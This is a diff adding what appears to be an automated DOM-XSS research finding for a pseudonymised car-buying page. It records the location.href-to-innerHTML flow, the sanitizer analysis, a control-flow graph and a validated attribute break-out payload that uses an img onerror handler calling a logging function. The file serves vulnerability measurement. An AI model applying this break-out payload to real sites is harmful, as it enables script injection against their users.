@@ -1,0 +1,92 @@
+// Finding: 545833f0-d62a-41ec-b84e-a6636508dec1
+// Finding.url: https://www.example233.com/car-buying/top-monthly-discounts.html##"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog('e4b89b3e495049ada18d27be58d2c882')><!--/*
+// Finding.parentloc: https://www.example233.com/car-buying/top-monthly-discounts.html##"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog('e4b89b3e495049ada18d27be58d2c882')><!--/*
+// Finding.domain: www.example233.com
+// Finding.base_domain: example233.com
+// Finding.source: location.href
+// Finding.sink: innerHTML
+// Sanitizer.score: 15
+// Sanitizer.name: mb[3]
+// Sanitizer.location: https://www.example22.com/gtm.js?id=GTM-WSMTS9 - mb[3]:1687:385
+// Finding.begin: 335
+// Finding.end: 348
+// Finding.original_uuid: ff977590-4cd8-4b1d-866b-1c3aaff3fbc0
+// Finding.TwentyFiveMillionFlowsId: -260392086
+// Finding.script: https://www.example22.com/gtm.js?id=GTM-WSMTS9
+// Finding.line: 1699
+// Exploit.uuid: e4b89b3e-4950-49ad-a18d-27be58d2c882
+// Exploit.success: true
+// Exploit.status: validated
+// Exploit.method: C
+// Exploit.type: html
+// Exploit.token: attribute
+// Exploit.content: href
+// Exploit.quote_type: "
+// Exploit.tag: a
+// Exploit.break_out: #"></iframe></style></script></object></embed></textarea><img src=x onerror=
+// Exploit.break_in: ><!--/*
+// Exploit.payload: #"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog(1)><!--/*
+// Exploit.begin_taint_url: 0
+// Exploit.end_taint_url: 61
+// Exploit.replace_begin_url: 61
+// Exploit.replace_end_url: 61
+// Exploit.replace_begin_param: 184
+// Exploit.replace_end_param: 184
+// Issues.LargestEncodeAttrStringChain: 0
+// Issues.LargestTextFragmentEncodeChainLength: 0
+// Issues.HasApproximation: true
+// Issues.HasMissingImplementation: false
+// Issues.HasInfiniteRegexWithFunctionReplacer: false
+// Issues.MergedSplitAndJoins: false
+// Issues.HasUrlInRhsOfReplace: false
+// Issues.HasUrlInLhsOfReplace: false
+// Issues.HasCookieValueInLhsOfreplace: false
+// Issues.HasCookieValueInRhsOfreplace: false
+// Issues.HasCookieValueInMatchPattern: false
+// Issues.HasCookieValueInExecPattern: false
+// Issues.RemovedLRConcats: true
+// Issues.RemovedReplaceArtifacts: false
+// Issues.HasUrlInMatchPattern: false
+// Issues.HasUrlInExecPattern: false
+// Issues.RemovedNOPreplaces: false
+// Issues.Known_sanitizer: false
+// DepGraph.hash: -1881187588
+// DepGraph.sanitizer_hash: -71061185
+// Removed LR concats 
+// Approximated Implementation for: replace([\x00- \x22\x27-\x29\x3c\x3e\\\x7b\x7d\x7f\x85\xa0\u2028\u2029\uff01\uff03\uff04\uff06-\uff0c\uff0f\uff1a\uff1b\uff1d\uff1f\uff20\uff3b\uff3d]/g: 1, s: 0, u: 0, m: 0, i: 0 [escapes(<: 1, >: 1, ": 1, ': 1, \: 1,  : 1, (: 1, ): 1, {: 1, }: 1), function_rhs: true], 'function(a){return Jb[a]}') - Other Exception: ReferenceError: Jb is not defined 
+// Approximated Implementation for: replace([\x00\x22\x26\x27\x3c\x3e]/g: 1, s: 0, u: 0, m: 0, i: 0 [escapes(<: 1, >: 1, &: 1, ": 1, ': 1), function_rhs: true], 'function(a){return qb[a]}') - Other Exception: ReferenceError: qb is not defined 
+digraph cfg {
+n0 [shape=house, label="Input: x"];
+n1 [shape=ellipse, label="encodeURIComponent"];
+n2 [shape=box, label="Var: x"];
+n3 [shape=ellipse, label="."];
+n4 [shape=box, label="Lit: https://sb.scorecardresearch.com/p?c1=2&c2=35121629&c4="];
+n5 [shape=ellipse, label="preg_replace"];
+n6 [shape=box, label="RegExp: /[\x00- \x22\x27-\x29\x3c\x3e\\\x7b\x7d\x7f\x85\xa0\u2028\u2029\uff01\uff03\uff04\uff06-\uff0c\uff0f\uff1a\uff1b\uff1d\uff1f\uff20\uff3b\uff3d]/"];
+n7 [shape=box, label="Lit: "];
+n8 [shape=box, label="Var: x"];
+n9 [shape=ellipse, label="."];
+n10 [shape=box, label="Lit: https://sb.scorecardresearch.com/p?c1=2&amp;c2=35121629&amp;"];
+n11 [shape=ellipse, label="preg_replace"];
+n12 [shape=box, label="RegExp: /[\x00\x22\x26\x27\x3c\x3e]/"];
+n13 [shape=box, label="Lit: "];
+n14 [shape=box, label="Var: x"];
+n15 [shape=box, label="Var: x"];
+n16 [shape=doubleoctagon, label="Return: x"];
+n2 -> n0;
+n1 -> n2;
+n3 -> n4;
+n3 -> n1;
+n8 -> n3;
+n5 -> n6;
+n5 -> n7;
+n5 -> n8;
+n9 -> n10;
+n9 -> n5;
+n14 -> n9;
+n11 -> n12;
+n11 -> n13;
+n11 -> n14;
+n15 -> n11;
+n16 -> n15;
+}
